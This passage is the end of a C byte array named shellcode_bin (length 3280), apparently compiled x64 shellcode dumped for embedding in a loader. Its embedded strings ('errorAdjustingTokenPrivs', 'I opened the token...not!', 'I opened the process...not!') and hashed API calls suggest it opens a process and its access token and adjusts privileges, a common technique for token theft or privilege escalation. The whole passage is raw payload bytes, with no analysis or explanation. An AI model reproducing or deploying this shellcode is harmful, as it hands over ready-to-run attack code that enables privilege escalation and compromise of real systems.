  0x41, 0x0f, 0xb6, 0x44, 0x3d, 0x00, 0x48, 0x83, 0xc3, 0x01, 0x48, 0x83,
  0xc7, 0x01, 0x88, 0x43, 0xff, 0x4c, 0x89, 0xe9, 0xff, 0xd6, 0x48, 0x39,
  0xc7, 0x72, 0xe5, 0xc6, 0x03, 0x0a, 0x48, 0x8d, 0x65, 0xc8, 0x5b, 0x5e,
  0x5f, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3, 0x90,
  0x48, 0xb8, 0x65, 0x72, 0x72, 0x6f, 0x72, 0x41, 0x64, 0x6a, 0xc6, 0x84,
  0x24, 0x38, 0x02, 0x00, 0x00, 0x00, 0x45, 0x31, 0xf6, 0x48, 0xba, 0x75,
  0x73, 0x74, 0x69, 0x6e, 0x67, 0x54, 0x6f, 0x48, 0x89, 0x84, 0x24, 0x20,
  0x02, 0x00, 0x00, 0x48, 0xb8, 0x6b, 0x65, 0x6e, 0x50, 0x72, 0x69, 0x76,
  0x73, 0x48, 0x89, 0x94, 0x24, 0x28, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84,
  0x24, 0x30, 0x02, 0x00, 0x00, 0xeb, 0x15, 0x0f, 0x1f, 0x44, 0x00, 0x00,
  0x43, 0x0f, 0xb6, 0x54, 0x35, 0x00, 0x48, 0x89, 0xc3, 0x49, 0x83, 0xc6,
  0x01, 0x88, 0x50, 0xff, 0x4c, 0x89, 0xe9, 0xff, 0xd6, 0x49, 0x89, 0xc0,
  0x48, 0x8d, 0x43, 0x01, 0x4d, 0x39, 0xf0, 0x77, 0xdf, 0xc6, 0x03, 0x0a,
  0x48, 0x89, 0xc3, 0xe9, 0xa2, 0xfe, 0xff, 0xff, 0x0f, 0x1f, 0x40, 0x00,
  0xb9, 0x6f, 0x40, 0x6f, 0xa9, 0xe8, 0x8e, 0xf4, 0xff, 0xff, 0x49, 0x89,
  0xc6, 0x48, 0x85, 0xc0, 0x0f, 0x85, 0x95, 0xf8, 0xff, 0xff, 0xb9, 0x4f,
  0x94, 0x03, 0x8b, 0xe8, 0x78, 0xf4, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48,
  0x85, 0xc0, 0x0f, 0x85, 0x7f, 0xf8, 0xff, 0xff, 0xe9, 0x45, 0xff, 0xff,
  0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x49, 0x20,
  0x6f, 0x70, 0x65, 0x6e, 0x65, 0x64, 0x31, 0xff, 0x48, 0xba, 0x20, 0x74,
  0x68, 0x65, 0x20, 0x74, 0x6f, 0x6b, 0x48, 0x89, 0x84, 0x24, 0x20, 0x02,
  0x00, 0x00, 0x48, 0xb8, 0x65, 0x6e, 0x2e, 0x2e, 0x2e, 0x6e, 0x6f, 0x74,
  0x48, 0x89, 0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0xb8, 0x21, 0x00, 0x00,
  0x00, 0x48, 0x89, 0x94, 0x24, 0x28, 0x02, 0x00, 0x00, 0x66, 0x89, 0x84,
  0x24, 0x38, 0x02, 0x00, 0x00, 0xeb, 0x19, 0x66, 0x0f, 0x1f, 0x84, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x41, 0x0f, 0xb6, 0x54, 0x3d, 0x00, 0x48, 0x89,
  0xc3, 0x48, 0x83, 0xc7, 0x01, 0x88, 0x50, 0xff, 0x4c, 0x89, 0xe9, 0xff,
  0xd6, 0x49, 0x89, 0xc0, 0x48, 0x8d, 0x43, 0x01, 0x4c, 0x39, 0xc7, 0x72,
  0xdf, 0xc6, 0x03, 0x0a, 0x48, 0x8b, 0x8c, 0x24, 0x88, 0x00, 0x00, 0x00,
  0x48, 0x89, 0xc3, 0xe9, 0x25, 0xfe, 0xff, 0xff, 0x0f, 0x1f, 0x40, 0x00,
  0x48, 0xb8, 0x49, 0x20, 0x6f, 0x70, 0x65, 0x6e, 0x65, 0x64, 0x31, 0xff,
  0x48, 0xba, 0x20, 0x74, 0x68, 0x65, 0x20, 0x70, 0x72, 0x6f, 0xc7, 0x84,
  0x24, 0x38, 0x02, 0x00, 0x00, 0x6f, 0x74, 0x21, 0x00, 0x48, 0x89, 0x84,
  0x24, 0x20, 0x02, 0x00, 0x00, 0x48, 0xb8, 0x63, 0x65, 0x73, 0x73, 0x2e,
  0x2e, 0x2e, 0x6e, 0x48, 0x89, 0x94, 0x24, 0x28, 0x02, 0x00, 0x00, 0x48,
  0x89, 0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0xeb, 0x14, 0x0f, 0x1f, 0x00,
  0x41, 0x0f, 0xb6, 0x44, 0x3d, 0x00, 0x48, 0x83, 0xc3, 0x01, 0x48, 0x83,
  0xc7, 0x01, 0x88, 0x43, 0xff, 0x4c, 0x89, 0xe9, 0xff, 0xd6, 0x48, 0x39,
  0xc7, 0x72, 0xe5, 0xe9, 0x4b, 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};
unsigned int shellcode_bin_len = 3280;
